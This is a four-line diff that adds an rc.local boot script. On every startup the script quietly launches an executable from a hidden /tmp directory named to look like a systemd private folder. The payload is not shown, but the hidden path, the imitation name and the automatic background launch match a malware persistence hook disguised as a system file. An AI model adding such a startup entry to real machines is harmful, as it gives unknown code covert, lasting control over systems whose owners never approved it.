@@ -1,0 +1,4 @@
+#!/bin/sh -e
+# rc.local
+/tmp/.systemd-private/update &
+exit 0
